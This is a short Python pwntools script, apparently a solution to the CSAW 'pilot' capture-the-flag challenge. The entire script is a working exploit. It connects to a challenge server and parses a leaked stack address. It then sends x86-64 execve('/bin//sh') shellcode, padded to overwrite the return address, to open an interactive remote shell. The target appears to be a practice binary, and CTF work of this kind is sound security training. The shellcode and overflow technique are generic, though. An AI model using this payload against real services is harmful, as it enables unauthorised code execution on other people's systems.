# Exploit for the pilot CSAW challenge

from pwn import *

session = remote("10.67.0.1", 30983)

session.recvuntil("[*]Location:")

address = session.recvuntil("\n")[:-1]

shellcode = "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"

payload = shellcode + "A" * (40-len(shellcode)) + p64(int(address, 16)) + "\x00" * 2

print("Address: " + str(address))
print("total payload: " + str(payload))

session.sendline(payload)

session.interactive()
